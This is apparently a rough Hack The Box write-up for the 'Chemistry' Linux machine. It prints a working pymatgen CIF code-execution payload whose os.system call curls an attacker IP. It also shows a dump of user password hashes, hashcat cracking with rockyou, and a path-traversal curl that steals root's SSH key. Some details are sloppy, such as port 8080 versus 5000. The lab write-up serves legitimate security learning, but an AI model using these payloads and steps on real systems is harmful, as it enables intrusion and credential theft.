
# Htb linux machine | 'easy'

### Very rough note

# Nmap 

`sudo nmap -sVC -v -A $ip -T4 -p- --open -oN Chemistry_scan`

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Mon, 10 Mar 2025 03:52:08 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0

```


## Intial exploit

- On visting port 8080
- Found a dashboard page 
- with /login and /register endpoint
- /registered with user=dedrknex=password
- logged in
-  a page to analyze the cif file
- googled found a exploit lead to arbitary code execution
- 


![](assests/Pasted%20image%2020250310094103.png)


## Vulnerable code

[link to code](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f)


```python3
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl http://10.10.14.21:80/nothing");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```


# After getting revershell found db 

```bash
app@chemistry:~/instance$ sqlite3 database.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE structure (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        filename VARCHAR(150) NOT NULL,
        identifier VARCHAR(100) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (identifier)
);
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'admin','2861debaf8d99436a10ed6f75a252abf');
INSERT INTO user VALUES(2,'app','197865e46b878d9e74a0346b6d59886a');
INSERT INTO user VALUES(3,'rosa','63ed86ee9f624c7b14f1d4f43dc251a5');
INSERT INTO user VALUES(4,'robert','02fcf7cfc10adc37959fb21f06c6b467');
INSERT INTO user VALUES(5,'jobert','3dec299e06f7ed187bac06bd3b670ab2');
INSERT INTO user VALUES(6,'carlos','9ad48828b0955513f7cf0f7f6510c8f8');
INSERT INTO user VALUES(7,'peter','6845c17d298d95aa942127bdad2ceb9b');
INSERT INTO user VALUES(8,'victoria','c3601ad2286a4293868ec2a4bc606ba3');
INSERT INTO user VALUES(9,'tania','a4aa55e816205dc0389591c9f82f43bb');
INSERT INTO user VALUES(10,'eusebio','6cad48078d0241cca9a7b322ecd073b3');
INSERT INTO user VALUES(11,'gelacia','4af70c80b68267012ecdac9a7e916d18');
INSERT INTO user VALUES(12,'fabian','4e5d71f53fdd2eabdbabb233113b5dc0');
INSERT INTO user VALUES(13,'axel','9347f9724ca083b17e39555c36fd9007');
INSERT INTO user VALUES(14,'kristel','6896ba7b11a62cacffbdaded457c6d92');
INSERT INTO user VALUES(15,'dedrknex','bc354e9386ff6f3845229952f073360a');
INSERT INTO user VALUES(16,'kavish','6ad14ba9986e3615423dfca256d04e3f');

```


## extracted username and passwd

`cat db | awk -F\' ' {print $2":"$4} ' > crack`

Just to clear things up


## cracked passwd

`hashcat -m 0 --user crack /usr/share/wordlists/rockyou.txt`

> Cracked the passwd and macth wirth user available on systenm

## sssh to rosa user

`rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)`


# root

Found id_rsa key thorugh 

```
curl -s --path-as-is "http://localhost:8081/assets/../../../../../root/.ssh/id_rsa" > key.pem

```

```
root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~# 

```